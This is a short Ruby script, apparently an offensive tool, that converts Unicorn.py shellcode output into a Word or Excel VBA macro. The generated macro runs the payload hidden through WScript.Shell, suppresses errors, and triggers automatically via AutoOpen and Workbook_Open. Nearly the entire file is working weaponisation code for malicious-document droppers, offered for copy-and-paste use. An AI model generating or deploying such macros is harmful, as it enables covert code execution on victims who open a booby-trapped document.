#!/usr/bin/env ruby
#Use: unicorn2vba.rb unicornOutputFileHere
#Script is designed to format the output from TrustedSec's Unicorn.py
#It then spits out a copy/pasta Word macro
def usage
	puts "ruby unicorn2vba.rb unicornOutputFileHere" 
end
def parse (content)
#Adds initial double quotes
	content = '"' + content
#Split every 200 chars and then rejoin with newline and string continuation in order to meet the string var limitation
	content = content.scan(/.{1,200}/).join("\" & _\r\n\"")
	content += '"'
#Splits the shellcode at the 4500 char point because thats roughly 24-25 lines for the first var
	first, second = content.slice!(0...4500), content
#Formats the output for the VBA macro
#Due to VBA restrictions for the number lines used during string concatenation of 24 lines we split
#the shell amongst two different variables and then concatenate the contents in a third variable
	puts "Option Explicit"
	puts "Sub GetShellcode()"
	puts    "\t" + "On Error Resume Next"
	puts    "\t" + "Dim wsh As Object\n"
	puts    "\t" + 'Set wsh = CreateObject("WScript.Shell")'
	puts    "\t" + "Dim f1 As String\n"
	puts    "\t" + "Dim f2 As String\n"
	puts    "\t" + "Dim f3 As String\n"
	puts    "\t" + "f1 = " + first + '"'
	puts    "\n"
	puts    "\t" + "f2 = " + '"' + second
	puts    "\t" + "f3 = f1 & f2\n"
	puts    "\t" + "wsh.Run f3, 0"
	puts    "\t" + "On Error GoTo 0"
	puts "End Sub"
	puts "Sub AutoOpen()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
	puts "Sub Workbook_Open()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
end
if ARGV.empty?
	usage
else
	outputfile = File.open(ARGV[0]).read
	parse(outputfile)
end
